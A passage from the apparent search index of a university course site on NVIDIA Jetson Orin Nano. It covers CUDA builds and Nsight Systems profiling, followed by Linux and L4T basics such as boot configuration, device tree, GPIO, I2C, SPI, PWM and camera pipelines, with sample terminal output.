GPU)\nset(CMAKE_CUDA_ARCHITECTURES 87)  # For Jetson Orin\n\n# Add executables\nadd_executable(vector_add vector_add.cu)\nadd_executable(vector_multiply vector_multiply.cu)\nadd_executable(matrix_multiply matrix_multiply.cu)\nadd_executable(memory_demo memory_management.cu)\n\n# Set properties\nset_property(TARGET vector_add PROPERTY CUDA_SEPARABLE_COMPILATION ON)\nset_property(TARGET vector_multiply PROPERTY CUDA_SEPARABLE_COMPILATION ON)\nset_property(TARGET matrix_multiply PROPERTY CUDA_SEPARABLE_COMPILATION ON)\nset_property(TARGET memory_demo PROPERTY CUDA_SEPARABLE_COMPILATION ON)\n</code></pre> <pre><code># CMake build commands\nmkdir build &amp;&amp; cd build\ncmake ..\nmake -j4\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#profiling-with-nsight-systems","title":"\ud83d\udcca Profiling with Nsight Systems","text":""},{"location":"curriculum/01b_jetson_cuda/#1-install-nsight-systems","title":"1. Install Nsight Systems","text":"<p>Check the previous sections for the Nsight installation for Jetson <pre><code># Verify installation\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys --version\nNVIDIA Nsight Systems version 2024.5.4.34-245434855735v0\n</code></pre></p>"},{"location":"curriculum/01b_jetson_cuda/#2-basic-profiling-commands","title":"2. Basic Profiling Commands","text":"<pre><code># Profile vector addition with detailed GPU metrics\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys profile --stats=true --force-overwrite=true -o vector_add_profile ./vector_add\nGenerated:\n    /Developer/mycuda_samples/vector_add_profile.nsys-rep\n    /Developer/mycuda_samples/vector_add_profile.sqlite\n\n# Profile with CUDA API tracing\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys profile --trace=cuda,nvtx --stats=true -o detailed_profile ./matrix_multiply\nGenerated:\n    /Developer/mycuda_samples/detailed_profile.nsys-rep\n    /Developer/mycuda_samples/detailed_profile.sqlite\n\n# Profile with system-wide metrics\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys profile --trace=cuda,osrt,nvtx --stats=true --force-overwrite=true -o system_profile ./vector_multiply\nGenerated:\n    /Developer/mycuda_samples/system_profile.nsys-rep\n    /Developer/mycuda_samples/system_profile.sqlite\n\nroot@sjsujetson-01:/Developer/mycuda_samples# ls\nMakefile                   memory_management        vector_add\ndetailed_profile.nsys-rep  memory_management.cu     vector_add.cu\ndetailed_profile.sqlite    simple                   vector_add_profile.nsys-rep\nmatrix_multiply            simple.cu                vector_add_profile.sqlite\nmatrix_multiply.cu         system_profile.nsys-rep  vector_multiply\nmemory_demo                system_profile.sqlite    vector_multiply.cu\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#3-advanced-profiling-options","title":"3. Advanced Profiling Options","text":"<pre><code># Profile with custom duration and sampling\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys profile --duration=30 --sample=cpu --trace=cuda,osrt -o long_profile ./memory_demo\nCollecting data...\n[Memory Manager] Starting async transfer demo...\n[Memory Manager] Starting unified memory demo...\nFirst 5 squared values: 0 1 4 9 16 \n[Memory Manager] Running bandwidth test...\nHost-to-Device Bandwidth: 7.44411 GB/s\nGenerating '/tmp/nsys-report-48f4.qdstrm'\n[1/1] [========================100%] long_profile.nsys-rep\nGenerated:\n    /Developer/mycuda_samples/long_profile.nsys-rep\n\n# Profile with environment variables for detailed CUDA info\nroot@sjsujetson-01:/Developer/mycuda_samples# CUDA_LAUNCH_BLOCKING=1 nsys profile --trace=cuda,nvtx --stats=true -o blocking_profile ./matrix_multiply\nGenerated:\n    /Developer/mycuda_samples/blocking_profile.nsys-rep\n    /Developer/mycuda_samples/blocking_profile.sqlite\n\n# Profile with memory transfer analysis\nroot@sjsujetson-01:/Developer/mycuda_samples# nsys profile --trace=cuda,osrt --cuda-memory-usage=true -o memory_profile ./memory_demo\nCollecting data...\n[Memory Manager] Starting async transfer demo...\n[Memory Manager] Starting unified memory demo...\nFirst 5 squared values: 0 1 4 9 16 \n[Memory Manager] Running bandwidth test...\nHost-to-Device Bandwidth: 7.35592 GB/s\nGenerating '/tmp/nsys-report-8aab.qdstrm'\n[1/1] [========================100%] memory_profile.nsys-rep\nGenerated:\n    /Developer/mycuda_samples/memory_profile.nsys-rep\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#4-analyzing-profile-results","title":"4. Analyzing Profile Results","text":"<pre><code># Generate text report\nnsys stats vector_add_profile.nsys-rep\n\n# Export to SQLite for custom analysis\nnsys export --type=sqlite vector_add_profile.nsys-rep\n\n# View in Nsight Systems GUI (if available)\nnsight-sys vector_add_profile.nsys-rep\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#5-code-instrumentation-for-better-profiling","title":"5. Code Instrumentation for Better Profiling","text":"<p>This part of the code is not tested.</p> <pre><code>// Add NVTX markers for better profiling visibility\n#include &lt;nvtx3/nvToolsExt.h&gt;\n\nvoid instrumented_vector_add() {\n    // Mark the beginning of memory allocation\n    nvtxRangePush(\"Memory Allocation\");\n\n    float *d_A, *d_B, *d_C;\n    cudaMalloc(&amp;d_A, bytes);\n    cudaMalloc(&amp;d_B, bytes);\n    cudaMalloc(&amp;d_C, bytes);\n\n    nvtxRangePop();\n\n    // Mark data transfer\n    nvtxRangePush(\"Host to Device Transfer\");\n    cudaMemcpy(d_A, h_A.data(), bytes, cudaMemcpyHostToDevice);\n    cudaMemcpy(d_B, h_B.data(), bytes, cudaMemcpyHostToDevice);\n    nvtxRangePop();\n\n    // Mark kernel execution\n    nvtxRangePush(\"Kernel Execution\");\n    vector_add_kernel&lt;&lt;&lt;blocks, threads_per_block&gt;&gt;&gt;(d_A, d_B, d_C, N);\n    cudaDeviceSynchronize();\n    nvtxRangePop();\n\n    // Mark result transfer\n    nvtxRangePush(\"Device to Host Transfer\");\n    cudaMemcpy(h_C.data(), d_C, bytes, cudaMemcpyDeviceToHost);\n    nvtxRangePop();\n}\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#6-performance-optimization-tips","title":"6. Performance Optimization Tips","text":"<pre><code># Check GPU utilization\nnsys stats --report=gpukernsum profile.nsys-rep\n\n# Analyze memory bandwidth utilization\nnsys stats --report=gpumemtimesum profile.nsys-rep\n\n# Check for optimization opportunities\nnsys stats --report=cudaapisum profile.nsys-rep\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#7-automated-profiling-script","title":"7. Automated Profiling Script","text":"<pre><code>#!/bin/bash\n# profile_all.sh - Automated profiling script\n\necho \"Building examples...\"\nmake clean &amp;&amp; make profile\n\necho \"Profiling vector addition...\"\nnsys profile --stats=true --force-overwrite=true -o vector_add_profile ./vector_add\n\necho \"Profiling matrix multiplication...\"\nnsys profile --stats=true --force-overwrite=true -o matrix_multiply_profile ./matrix_multiply\n\necho \"Generating reports...\"\nnsys stats vector_add_profile.nsys-rep &gt; vector_add_report.txt\nnsys stats matrix_multiply_profile.nsys-rep &gt; matrix_multiply_report.txt\n\necho \"Profiling complete. Check *_report.txt files for results.\"\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#performance-benchmarking","title":"\ud83c\udfaf Performance Benchmarking","text":""},{"location":"curriculum/01b_jetson_cuda/#run-and-compare-results","title":"Run and Compare Results","text":"<pre><code># Make executable and run\nchmod +x profile_all.sh\n./profile_all.sh\n\n# Compare CPU vs GPU performance\ntime ./vector_add    # GPU version\ntime ./vector_add_cpu  # CPU version (if implemented)\n\n# Monitor GPU usage during execution\n#watch -n 1 nvidia-smi #nvidia-smi is not available in jetson\n</code></pre>"},{"location":"curriculum/02a_linux_basics/","title":"\ud83e\udde0 Introduction to Linux Basics on Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p> <p>This document introduces the fundamentals of the Linux operating system with a focus on practical usage for students working on NVIDIA Jetson devices like the Orin Nano. You'll also learn about NVIDIA's custom Linux version: L4T.</p>"},{"location":"curriculum/02a_linux_basics/#what-is-linux","title":"\ud83d\udcda What is Linux?","text":"<p>Linux is an open-source operating system that powers everything from phones to servers. Jetson uses a specialized version of Ubuntu Linux.</p> <p>Key Characteristics:</p> <ul> <li>Open-source and customizable</li> <li>Multi-user, multi-tasking environment</li> <li>Command-line and graphical interfaces</li> <li>High performance and low resource usage</li> </ul>"},{"location":"curriculum/02a_linux_basics/#linux-system-architecture","title":"\ud83c\udfd7\ufe0f Linux System Architecture","text":"<p>Linux architecture is typically divided into:</p>"},{"location":"curriculum/02a_linux_basics/#1-kernel","title":"1. Kernel","text":"<ul> <li>Core of the OS that interfaces with hardware</li> <li>Manages memory, processes, file systems, device drivers</li> </ul>"},{"location":"curriculum/02a_linux_basics/#2-shell","title":"2. Shell","text":"<ul> <li>Interface that accepts user commands (CLI)</li> <li>Common shells: <code>bash</code>, <code>zsh</code>, <code>sh</code></li> </ul>"},{"location":"curriculum/02a_linux_basics/#3-file-system-hierarchy","title":"3. File System Hierarchy","text":"<ul> <li><code>/</code>: Root of the filesystem</li> <li><code>/bin</code>, <code>/sbin</code>: Essential binaries</li> <li><code>/usr</code>: Secondary hierarchy for user-installed software</li> <li><code>/etc</code>: Configuration files</li> <li><code>/home</code>: Personal user directories</li> <li><code>/dev</code>, <code>/proc</code>, <code>/sys</code>: Virtual files for devices and kernel state</li> </ul>"},{"location":"curriculum/02a_linux_basics/#4-user-space-and-daemons","title":"4. User Space and Daemons","text":"<ul> <li>System and user-level applications</li> <li>Daemons provide background services (e.g., <code>systemd</code>, <code>networkd</code>)</li> </ul>"},{"location":"curriculum/02a_linux_basics/#what-is-jetson-l4t","title":"\ud83e\udde9 What is Jetson L4T?","text":"<p>L4T (Linux for Tegra) is NVIDIA\u2019s embedded Linux distribution tailored for Jetson SoCs (System-on-Chip). It extends standard Ubuntu with:</p>"},{"location":"curriculum/02a_linux_basics/#components","title":"\ud83d\udce6 Components:","text":"<ul> <li>Ubuntu Base Image: L4T usually uses Ubuntu 20.04 or 22.04 LTS</li> <li>Tegra Drivers: GPU, ISP, CSI camera, I2C, SPI, PWM</li> <li>Bootloader Stack: U-Boot, CBoot, extlinux</li> <li>CUDA Toolkit: GPU-accelerated computing framework</li> <li>TensorRT: Inference optimizer and runtime</li> <li>cuDNN: Deep neural network acceleration libraries</li> <li>Multimedia API: V4L2, GStreamer, OpenMAX for camera and audio</li> </ul>"},{"location":"curriculum/02a_linux_basics/#architecture","title":"\ud83e\uddec Architecture:","text":"<ul> <li>Jetson boots via UEFI or CBoot into Linux kernel</li> <li>Kernel loads NVIDIA drivers (GPU, CPU governors, DeepSleep)</li> <li>Device tree manages hardware layout (CPU/GPU/I/O)</li> <li>Userland launches graphical UI or SSH terminal</li> </ul>"},{"location":"curriculum/02a_linux_basics/#l4t-version-check","title":"\ud83d\udd0d L4T Version Check:","text":"<pre><code>sjsujetson@sjsujetson-01:~$ head -n 1 /etc/nv_tegra_release\n# R36 (release), REVISION: 4.3, GCID: 38968081, BOARD: generic, EABI: aarch64, DATE: Wed Jan  8 01:49:37 UTC 2025\n</code></pre> <p>This shows JetPack version and internal driver details.</p>"},{"location":"curriculum/02a_linux_basics/#popular-linux-commands","title":"\ud83d\udcbb Popular Linux Commands","text":"Command Description <code>ls</code> List files in a directory <code>cd</code> Change directory <code>pwd</code> Print working directory <code>cp</code> / <code>mv</code> / <code>rm</code> Copy, move, remove files <code>top</code> / <code>htop</code> Monitor system processes <code>cat</code> / <code>less</code> View file content <code>sudo</code> Run command with admin privileges <code>apt</code> Install or update software packages <code>chmod</code> / <code>chown</code> Change file permissions/ownership <code>journalctl</code> View system logs (via systemd) <code>dmesg</code> Print kernel ring buffer (boot logs) <code>lscpu</code>, <code>lsblk</code> List hardware info (CPU/disk)"},{"location":"curriculum/02a_linux_basics/#lab-exercise-advanced-linux-practice-on-jetson","title":"\ud83e\uddea Lab Exercise: Advanced Linux Practice on Jetson","text":""},{"location":"curriculum/02a_linux_basics/#step-1-file-system-exploration","title":"Step 1: File System Exploration","text":"<pre><code>cd /\nls -lh\nls -lh /dev /proc /sys /boot /media\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#step-2-system-monitoring-and-processes","title":"Step 2: System Monitoring and Processes","text":"<pre><code>top\nhtop  # Already installed, If not installed: sudo apt install htop\nps aux | grep python\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#step-3-examine-kernel-and-drivers","title":"Step 3: Examine Kernel and Drivers","text":"<pre><code>sjsujetson@sjsujetson-01:~$ uname -r\n5.15.148-tegra\nsjsujetson@sjsujetson-01:~$ lsmod | grep nvgpu\nnvgpu                2654208  23\nhost1x                180224  6 host1x_nvhost,host1x_fence,nvgpu,tegra_drm,nvidia_drm,nvidia_modeset\nmc_utils               16384  3 nvidia,nvgpu,tegra_camera_platform\nnvmap                 204800  79 nvgpu\nsjsujetson@sjsujetson-01:~$ cat /proc/device-tree/model\nNVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#step-4-explore-l4t-features","title":"Step 4: Explore L4T Features","text":"<pre><code>sjsujetson@sjsujetson-01:~$ head -n 1 /etc/nv_tegra_release\n# R36 (release), REVISION: 4.3, GCID: 38968081, BOARD: generic, EABI: aarch64, DATE: Wed Jan  8 01:49:37 UTC 2025\nsjsujetson@sjsujetson-01:~$ ls /usr/lib/aarch64-linux-gnu/tegra\nsjsujetson@sjsujetson-01:~$ nvpmodel -q\nNV Power Mode: MAXN_SUPER\n2\nsjsujetson@sjsujetson-01:~$ tegrastats\n07-14-2025 10:29:36 RAM 2147/7620MB (lfb 2x4MB) SWAP 1476/3810MB (cached 1MB) CPU [0%@729,0%@729,0%@729,0%@729,0%@729,0%@729] GR3D_FREQ 0% cpu@47.687C soc2@46.718C soc0@47.468C gpu@48.625C tj@48.625C soc1@48.25C VDD_IN 4556mW/4556mW VDD_CPU_GPU_CV 483mW/483mW VDD_SOC 1451mW/1451mW\n</code></pre> <p>Kernel handles VFS (Virtual File System)               |               |---&gt; Filesystem driver                         |                         |---&gt; Disk I/O</p>"},{"location":"curriculum/02a_linux_basics/#tracing-system-calls","title":"Tracing System Calls:","text":"<p><code>strace</code> lets you watch how programs talk to the kernel.</p> <pre><code># Install strace\napt install strace\n\n# Trace system calls of a command\nstrace ls -la\n\n# Trace specific system calls\nstrace -e trace=open,read,write cat /etc/passwd\n\n# Trace system calls of running process\nsudo strace -p &lt;PID&gt;\n\n# Count system calls\nstrace -c ls -la\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#jetson-l4t-in-depth-technical-analysis","title":"\ud83d\ude80 Jetson L4T: In-Depth Technical Analysis","text":""},{"location":"curriculum/02a_linux_basics/#l4t-architecture-overview","title":"\ud83c\udfd7\ufe0f L4T Architecture Overview","text":"<p>L4T (Linux for Tegra) is NVIDIA's comprehensive embedded Linux solution:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    Applications &amp; Frameworks                 \u2502\n\u2502  TensorRT \u2502 cuDNN \u2502 OpenCV \u2502 GStreamer \u2502 ROS \u2502 Docker      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                    CUDA Runtime &amp; Libraries                  \u2502\n\u2502  CUDA Toolkit \u2502 cuBLAS \u2502 cuFFT \u2502 Thrust \u2502 NPP             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                    L4T User Space                           \u2502\n\u2502  Ubuntu 20.04/22.04 \u2502 systemd \u2502 NetworkManager \u2502 X11/Wayland\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                    L4T Kernel Space                         \u2502\n\u2502  Linux Kernel \u2502 NVIDIA GPU Driver \u2502 Tegra Drivers          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                    Bootloader &amp; Firmware                    \u2502\n\u2502  CBoot \u2502 U-Boot \u2502 TOS \u2502 BPMP-FW \u2502 Device Tree             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                    Tegra SoC Hardware                       \u2502\n\u2502  ARM CPU \u2502 NVIDIA GPU \u2502 ISP \u2502 VIC \u2502 NVENC \u2502 NVDEC \u2502 I/O    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#l4t-components-deep-dive","title":"\ud83d\udce6 L4T Components Deep Dive","text":""},{"location":"curriculum/02a_linux_basics/#1-bootloader-chain","title":"1. Bootloader Chain","text":"<pre><code># Check bootloader information\nsjsujetson@sjsujetson-01:~$ cat /proc\nroot=PARTUUID=2eea7ca9-2b58-4100-80a1-ba1b97bdc52b rw rootwait rootfstype=ext4 mminit_loglevel=4 console=ttyTCU0,115200 firmware_class.path=/etc/firmware fbcon=map:0 nospectre_bhb video=efifb:off console=tty0 bl_prof_dataptr=2031616@0x271E10000 bl_prof_ro_ptr=65536@0x271E00000\n\n# View boot configuration\nsjsujetson@sjsujetson-01:~$ ls -la /boot/extlinux/\ntotal 24\ndrwxr-xr-x 2 root root  4096 Jun 22 14:24 .\ndrwxr-xr-x 5 root root 12288 Jun 22 15:19 ..\n-rw-r--r-- 1 root root   938 Jun 22 14:24 extlinux.conf\n-rw-r--r-- 1 root root   727 Apr 21 10:59 extlinux.conf.nv-update-extlinux-backup\n\nsjsujetson@sjsujetson-01:~$ cat /boot/extlinux/extlinux.conf\nTIMEOUT 30\nDEFAULT primary\n\nMENU TITLE L4T boot options\n\nLABEL primary\n      MENU LABEL primary kernel\n      LINUX /boot/Image\n      INITRD /boot/initrd\n      APPEND ${cbootargs} root=PARTUUID=2eea7ca9-2b58-4100-80a1-ba1b97bdc52b rw rootwait rootfstype=ext4 mminit_loglevel=4 console=ttyTCU0,115200 firmware_class.path=/etc/firmware fbcon=map:0 nospectre_bhb video=efifb:off console=tty0\n\n# Check boot partition\nlsblk -f\n</code></pre> <p>Boot Sequence: 1. BootROM: Hardware initialization, loads CBoot 2. CBoot: NVIDIA's bootloader, loads kernel and device tree 3. Linux Kernel: Initializes hardware, loads drivers 4. systemd: User space initialization</p>"},{"location":"curriculum/02a_linux_basics/#2-device-tree-and-hardware-configuration","title":"2. Device Tree and Hardware Configuration","text":"<pre><code># View device tree information\nsjsujetson@sjsujetson-01:~$ ls /proc/device-tree/\n'#address-cells'       dsu-pmu2             regulator-vdd-1v1-hub    soc1-throttle-alert\n aliases               firmware             regulator-vdd-1v8-ao     soc2-throttle-alert\n bpmp                  gpio-keys            regulator-vdd-1v8-hs     soctherm-oc-event\n bus@0                 gpu-throttle-alert   regulator-vdd-1v8-sys    sound\n camera-ivc-channels   hot-surface-alert    regulator-vdd-3v3-ao     sram@40000000\n chosen                interrupt-parent     regulator-vdd-3v3-pcie   __symbols__\n compatible            mgbe-vm-irq-config   regulator-vdd-3v3-sd     tegra-capture-vi\n cpus                  model                regulator-vdd-3v3-sys    tegra-carveouts\n cpu-throttle-alert    name                 regulator-vdd-5v0-sys    tegra-hsp@b950000\n cv0-throttle-alert    nvpmodel             reserved-memory          tegra_mce@e100000\n cv1-throttle-alert    opp-table-cluster0   rtcpu@bc00000            tegra-rtcpu-trace\n cv2-throttle-alert    opp-table-cluster1   scf-pmu                  thermal-zones\n dce@d800000           opp-table-cluster2   serial                   timer\n display@13800000      pmu                  serial-number            tsc_sig_gen@c6a0000\n dsu-pmu0              psci                '#size-cells'             vm-irq-config\n dsu-pmu1              pwm-fan              soc0-throttle-alert\n\nsjsujetson@sjsujetson-01:~$ cat /proc/device-tree/model\nNVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\nsjsujetson@sjsujetson-01:~$ cat /proc/device-tree/compatible\nnvidia,p3768-0000+p3767-0005-supernvidia,p3767-0005nvidia,tegra234\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#3-nvidia-gpu-driver-architecture","title":"3. NVIDIA GPU Driver Architecture","text":"<pre><code># Check GPU driver version\nsjsujetson@sjsujetson-01:~$ cat /proc/driver/nvidia/version\nNVRM version: NVIDIA UNIX Open Kernel Module for aarch64  540.4.0  Release Build  (buildbrain@mobile-u64-6336-d8000)  Tue Jan  7 17:35:12 PST 2025\nGCC version:  collect2: error: ld returned 1 exit status\n\n# View GPU device information\nsjsujetson@sjsujetson-01:~$ ls -la /dev/nvidia*\ncrw-rw-rw- 1 root root 195,   0 Dec 31  1969 /dev/nvidia0\ncrw-rw-rw- 1 root root 195, 255 Dec 31  1969 /dev/nvidiactl\ncrw-rw-rw- 1 root root 195, 254 Dec 31  1969 /dev/nvidia-modeset\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#4-tegra-specific-drivers-and-services","title":"4. Tegra-Specific Drivers and Services","text":"<pre><code># List Tegra-specific kernel modules\nsjsujetson@sjsujetson-01:~$ lsmod | grep tegra\n\nsjsujetson@sjsujetson-01:~$ lsmod | grep nvgpu\nnvgpu                2654208  23\nhost1x                180224  6 host1x_nvhost,host1x_fence,nvgpu,tegra_drm,nvidia_drm,nvidia_modeset\nmc_utils               16384  3 nvidia,nvgpu,tegra_camera_platform\nnvmap                 204800  79 nvgpu\n\nsjsujetson@sjsujetson-01:~$ lsmod | grep nvhost\n\n# Check Tegra driver information\nmodinfo tegra_xudc\nmodinfo nvgpu\n\n# View Tegra-specific devices\nls -la /dev/tegra*\nls -la /dev/nvhost*\n</code></pre>"},{"location":"curriculum/02a_linux_basics/#hardware-access-and-driver-interface","title":"\ud83d\udd0c Hardware Access and Driver Interface","text":"<p><code>/opt/nvidia/jetson-io/jetson-io.py</code> is a tool to configure 40-pin header from Nvidia.</p>"},{"location":"curriculum/02a_linux_basics/#1-gpio-general-purpose-inputoutput","title":"1. GPIO (General Purpose Input/Output)","text":"<p>GPIO (General Purpose Input/Output) pins allow the Jetson board to interface with external hardware such as LEDs, buttons, sensors, and relays. Each pin can be configured as either:     - Input \u2013 to read digital signals (e.g. button press)     - Output \u2013 to send digital signals (e.g. turn on an LED)</p> <p>On modern Jetson platforms, using libgpiod is generally better and more future-proof than using the older sysfs (/sys/class/gpio) GPIO interface.</p> <p><pre><code># Install gpiod via sudo apt install gpiod (already installed)\n#Discover GPIO chips:\nsjsujetson@sjsujetson-01:~$ gpiodetect\ngpiochip0 [tegra234-gpio] (164 lines)\ngpiochip1 [tegra234-gpio-aon] (32 lines)\n#List lines on a chip:\nsjsujetson@sjsujetson-01:~$ gpioinfo gpiochip0\ngpiochip0 - 164 lines:\n    line   0:      \"PA.00\" \"regulator-vdd-3v3-sd\" output active-high [used]\n    line   1:      \"PA.01\"       unused   input  active-high\n    ....\n</code></pre> gpiochip0 \u2192 164 lines (main Tegra GPIO); gpiochip1 \u2192 32 lines (AON = always-on GPIO, often used for wake, power buttons, etc.)</p> <p>Physical Pin 7 on the 40-pin header is connected to GPIO3_PBB.00. That corresponds to GPIO line 84 on gpiochip0 (according to NVIDIA\u2019s Orin Nano mapping). <pre><code>sjsujetson@sjsujetson-01:~$ gpioinfo gpiochip0 | grep -i 84\n    line  84:      \"PN.00\"       unused   input  active-high\n</code></pre> tells us that:     \u2022   GPIO line 84 maps to PN.00 (port N, pin 0)     \u2022   It\u2019s currently configured as an input     \u2022   It is unused, so safe to control</p> <pre><code>#Temporarily Set Line 84 to Output &amp; Drive High:\ngpioset gpiochip0 84=1 #automatically requests the line as output, sets it HIGH, and releases it after execution.\n#To hold the output state (e.g., keep LED on), use the --mode=wait flag\ngpioset --mode=wait gpiochip0 84=1\n</code></pre> <p>if use Python (with libgpiod): <code>sudo apt install python3-libgpiod</code></p> <p><code>Jetson.GPIO</code> is another popular GPIO python library developed by Nvidia, but it uses sysfs (deprecated), which is deprecated in the Linux kernel since 4.8, and removed in Linux 5.10+.</p>"},{"location":"curriculum/02a_linux_basics/#2-i2c-inter-integrated-circuit","title":"2. I2C (Inter-Integrated Circuit)","text":"<p><pre><code># List I2C buses\nsjsujetson@sjsujetson-01:~$ ls /dev/i2c-*\n/dev/i2c-0  /dev/i2c-1  /dev/i2c-2  /dev/i2c-4  /dev/i2c-5  /dev/i2c-7  /dev/i2c-9\n\nsjsujetson@sjsujetson-01:~$ i2cdetect -l\ni2c-0   i2c         3160000.i2c                         I2C adapter\ni2c-1   i2c         c240000.i2c                         I2C adapter\ni2c-2   i2c         3180000.i2c                         I2C adapter\ni2c-4   i2c         Tegra BPMP I2C adapter              I2C adapter\ni2c-5   i2c         31b0000.i2c                         I2C adapter\ni2c-7   i2c         c250000.i2c                         I2C adapter\ni2c-9   i2c         NVIDIA SOC i2c adapter 0            I2C adapter\n\n# Scan I2C bus for devices (bus 1)\ni2cdetect -y 1\n</code></pre> You can use the <code>smbus2</code> library to use Python for I2C.</p>"},{"location":"curriculum/02a_linux_basics/#3-spi-serial-peripheral-interface","title":"3. SPI (Serial Peripheral Interface)","text":"<p><pre><code># Check SPI devices\nsjsujetson@sjsujetson-01:~$ ls /dev/spidev*\n/dev/spidev0.0  /dev/spidev0.1  /dev/spidev1.0  /dev/spidev1.1\n</code></pre> To read from an SPI device on your Jetson Orin Nano using Python, you typically use the spidev module, which provides access to the SPI bus via /dev/spidev*.</p>"},{"location":"curriculum/02a_linux_basics/#4-pwm-pulse-width-modulation","title":"4. PWM (Pulse Width Modulation)","text":"<pre><code># Check PWM chips\nsjsujetson@sjsujetson-01:~$ ls /sys/class/pwm/\npwmchip0  pwmchip1  pwmchip2  pwmchip3  pwmchip4\n</code></pre> <p>Controlling PWM (Pulse Width Modulation) on NVIDIA Jetson (e.g., Orin Nano, Xavier NX, Nano) in Python requires configuring the correct pins and using the Linux PWM sysfs interface or pwmchip character devices.</p>"},{"location":"curriculum/02a_linux_basics/#camera-and-multimedia-subsystem","title":"\ud83d\udcf9 Camera and Multimedia Subsystem","text":""},{"location":"curriculum/02a_linux_basics/#1-camera-interface-csi","title":"1. Camera Interface (CSI)","text":"<pre><code># List video devices\nls /dev/video*\n#sudo apt install v4l-utils\nv4l2-ctl --list-devices\n\n# Get camera capabilities\nv4l2-ctl -d /dev/video0 --all\nv4l2-ctl -d /dev/video0 --list-formats-ext\n\n# Capture image using GStreamer\ngst-launch-1.0 nvarguscamerasrc ! 'video/x-raw(memory:NVMM),width=1920,height=1080' ! nvjpegenc ! filesink location=test.jpg\n\n# Live camera preview\ngst-launch-1.0 nvarguscamerasrc ! 'video/x-raw(memory:NVMM),width=1280,height=720' ! nvvidconv ! xvimagesink\n</code></pre> <p>Python Camera Example: <pre><code>#!/usr/bin/env python3\nimport cv2\nimport numpy as np\n\ndef gstreamer_pipeline(\n    capture_width=1280,\n    capture_height=720,\n    display_width=640,\n    display_height=480,\n    